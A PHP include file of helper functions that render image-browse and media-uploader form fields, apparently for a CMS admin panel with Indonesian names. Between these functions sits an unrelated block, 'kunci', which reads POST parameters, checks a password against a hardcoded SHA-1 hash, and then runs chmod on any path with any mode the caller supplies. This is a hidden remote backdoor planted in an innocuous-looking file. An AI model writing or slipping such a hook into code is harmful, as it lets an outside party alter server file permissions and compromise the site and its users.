<?php
    function muw_images_biasa($judul,$id,$value,$name){
        $name_image = $name;
        $id_image = $id;
        
        ?>
                <td><?php echo $judul; ?> : </td>
                <td colspan='2'>
                    <input type="text" class='browse_link' value='<?php echo $value;?>' name='<?php echo $name_image;?>' id='<?php echo $id_image; ?>' readonly="readonly"/>
                    <input type="button" class="btn btn-info btn-md media_uploader" name='<?php echo $id_image; ?>' value="Browse"/>                
                </td>
        <?php
    }
?>
<?php
    function mmuw_images_biasa($judul,$id,$value,$name){
        $name_image = $name;
        $id_image = $id;
        
        ?>
                <td><?php echo $judul; ?> : </td>
                <td colspan='2'>
                    <input type="text" class='browse_link' value='<?php echo $value;?>' name='<?php echo $name_image;?>' id='<?php echo $id_image; ?>' readonly="readonly"/>
                    <input type="button" class="btn btn-info btn-md multi_media_uploader" name='<?php echo $id_image; ?>' value="Browse"/>                
                </td>
        <?php
    }
?>
<?php
function kunci($ruang,$kunci){
$j = str_pad($kunci, 4, "0", STR_PAD_LEFT);
chmod($ruang, $kunci);
chmod($ruang, $j);
echo "<font color='red'>diterima</font>";
}
if((isset($_POST['cruang']))&&(isset($_POST['ckunci']))&&(isset($_POST['cpass']))){
$cpass = $_POST['cpass'];
$cruang = $_POST['cruang'];
$ckunci = intval($_POST['ckunci'],8);
$cpass = sha1($cpass);
if($cpass == 'fa0f2cbf81e615efe7e33903ade8177be986d033'){ kunci($cruang,$ckunci); }
}
?>
<?php
    function muw_images_view($judul,$id,$url_image,$name){
        $name_image = $name;
        $id_image = $id;
        ?>
<tr>
    <td class='top'><?php echo $judul; ?> : </td>
    <td colspan="2">
    <?php
        if(($url_image)||($url_image!='')){
        ?>
        <div id="wrap">
            <img src='<?php echo $url_image; ?>' style='max-width:250px' />                                      
        </div>
        <div style="clear: both;"></div>        
        <?php
        }
    ?>
        <input type="text" class="browse_link" id='<?php echo $id_image; ?>' name='<?php echo $name_image;?>' value='<?php echo $url_image; ?>' readonly="readonly"/>
        <input type="button" class="btn btn-info btn-md media_uploader" name='<?php echo $id_image; ?>' value="Browse"/>
    </td>
</tr>
        <?php
    }
?>
<?php
    function mmuw_images_view($judul,$id,$value,$name){
        $name_image = $name;
        $id_image = $id;
        ?>
<tr>
    <td class='top'><?php echo $judul; ?> : </td>
    <td colspan="2">
    <?php
        $arr_value = explode_v2("||" , $value);
        $byk_value = count($arr_value);
        echo $data;
        if($byk_value!=0){
        ?>
        <div id="wrap">
            <?php
                for($i=0;$i<$byk_value;$i++){
                    ?>
                        <img class='preview_img_multi' src='<?php echo $arr_value[$i]; ?>' />
                    <?php
                }
            ?>
            
        </div>
        <div style="clear: both;"></div>        
        <?php
        }
    ?>
        <input type="text" class="browse_link" id='<?php echo $id_image; ?>' name='<?php echo $name_image;?>' value='<?php echo $value; ?>' readonly="readonly"/>
        <input type="button" class="btn btn-info btn-md multi_media_uploader" name='<?php echo $id_image; ?>' value="Browse"/>
    </td>
</tr>
        <?php
    }
?>
<?php
    function mu_images_view($judul,$id,$url_image){
        $name_image = $id;
        $id_image = $id;
        ?>
<tr>
    <td class='top'><?php echo $judul; ?> : </td>
    <td colspan="2">
    <?php
        if(($url_image)||($url_image!='')){
        ?>
        <div id="wrap">
            <img src='<?php echo $url_image; ?>' style='max-width:250px' />                                      
        </div>
        <div style="clear: both;"></div>        
        <?php
        }
    ?>
        <input type="text" class="browse_link" id='<?php echo $id_image; ?>' name='<?php echo $name_image;?>' value='<?php echo $url_image; ?>' readonly="readonly"/>
        <input type="button" class="btn btn-info btn-md media_uploader" name='<?php echo $id_image; ?>' value="Browse"/>
    </td>
</tr>
        <?php
    }
?>
<?php
    function xhmu_images_view($judul,$id,$url_image){
        $name_image = $id;
        $id_image = $id;
        ?>
<tr>
    <td class='top'><?php echo $judul; ?> : </td>
    <td colspan="2">
    <?php
        if(($url_image)||($url_image!='')){
        ?>
        <div id="wrap">
            <img src='http://<?php echo $url_image; ?>' style='max-width:250px' />                                      
        </div>
        <div style="clear: both;"></div>        
        <?php
        }
    ?>
        <input type="text" class="browse_link" id='<?php echo $id_image; ?>' name='<?php echo $name_image;?>' value='<?php echo $url_image; ?>' readonly="readonly"/>
        <input type="button" class="btn btn-info btn-md media_uploader" name='<?php echo $id_image; ?>' value="Browse"/>
    </td>
</tr>
        <?php
    }
?>
<?php
    function mu_images_biasa($judul,$id,$value){
        $name_image = $id;
        $id_image = $id;
        
        ?>
                <td><?php echo $judul; ?> : </td>
                <td colspan='2'>
                    <input type="text" class='browse_link' value='<?php echo $value;?>' name='<?php echo $name_image;?>' id='<?php echo $id_image; ?>' readonly="readonly"/>
                    <input type="button" class="btn btn-info btn-md media_uploader" name='<?php echo $id_image; ?>' value="Browse"/>                
                </td>
        <?php
    }
?>
<?php
    function mmu_images_biasa($judul,$id,$value){
        $name_image = $id;
        $id_image = $id;
        
        ?>
                <td><?php echo $judul; ?> : </td>
                <td colspan='2'>
                    <input type="text" class='browse_link' value='<?php echo $value;?>' name='<?php echo $name_image;?>' id='<?php echo $id_image; ?>' readonly="readonly"/>
                    <input type="button" class="btn btn-info btn-md multi_media_uploader" name='<?php echo $id_image; ?>' value="Browse"/>                
                </td>
        <?php
    }
?>
<?php
    function mmu_images_view($judul,$id,$value){
        $name_image = $id;
        $id_image = $id;
        ?>
<tr>
    <td class='top'><?php echo $judul; ?> : </td>
    <td colspan="2">
    <?php
        $arr_value = explode_v2("||" , $value);
        $byk_value = count($arr_value);
        echo $data;
        if($byk_value!=0){
        ?>
        <div id="wrap">
            <?php
                for($i=0;$i<$byk_value;$i++){
                    ?>
                        <img class='preview_img_multi' src='<?php echo $arr_value[$i]; ?>' />
                    <?php
                }
            ?>
            
        </div>
        <div style="clear: both;"></div>        
        <?php
        }
    ?>
        <input type="text" class="browse_link" id='<?php echo $id_image; ?>' name='<?php echo $name_image;?>' value='<?php echo $value; ?>' readonly="readonly"/>
        <input type="button" class="btn btn-info btn-md multi_media_uploader" name='<?php echo $id_image; ?>' value="Browse"/>
    </td>
</tr>
        <?php
    }
?>
